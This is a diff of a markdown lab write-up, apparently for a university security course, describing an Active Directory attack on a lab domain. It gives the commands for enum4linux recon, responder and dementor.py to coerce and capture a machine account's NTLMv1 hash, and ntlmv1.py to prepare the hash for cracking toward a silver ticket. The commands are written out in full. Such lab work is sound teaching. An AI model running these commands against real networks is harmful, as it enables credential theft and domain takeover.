@@ -5,6 +5,7 @@ enum4linux 192.168.50.135
 ```
 The only information you need to run this command is the IP address of the Domain controller which in my case was 192.168.50.135.
 ![](https://raw.githubusercontent.com/njg7716/CSEC-742_ADE/main/Pasted%20image%2020210415122818.png)
+
 We find that the SID is "S-1-5-21-3294894903-2995586124-3146476039"
 This will be used later when generating the silver ticket.
 
@@ -20,14 +21,16 @@ While responder is running, we can use dementor so that responder catches the re
 python3 dementor.py -u hacker -p ‘WordPass1’ -d CYBERTIGERS 192.168.50.136 192.168.50.135
 ```
 Here the username is "hacker" with password "WordPass1", the domain is cybertigers and the first IP address is the attacker's machine and the second IP is the Domain Controller.
-![[Pasted image 20210415123202.png]]
+![](https://raw.githubusercontent.com/njg7716/CSEC-742_ADE/main/Pasted%20image%2020210415123018.png)
+
 We get the hash for the machine account to be WIN-A2HCLSJFD0C$::CYBERTIGERS:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:1122334455667788
 
 # NTLM MultiTool
 ``` bash 
 python ntlmv1.py --ntlmv1 "WIN-A2HCLSJFD0C$::CYBERTIGERS:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:D8C31819C7D7C02F9EEA1DF384DFC524DD51753DEFB3DA92:1122334455667788"
 ```
-![[Pasted image 20210415123624.png]]
+![](https://raw.githubusercontent.com/njg7716/CSEC-742_ADE/main/Pasted%20image%2020210415123624.png)
+
 This output of this command gives the exact syntax to crack the hash using either hashcat or crack.sh
 
 # Crack.sh
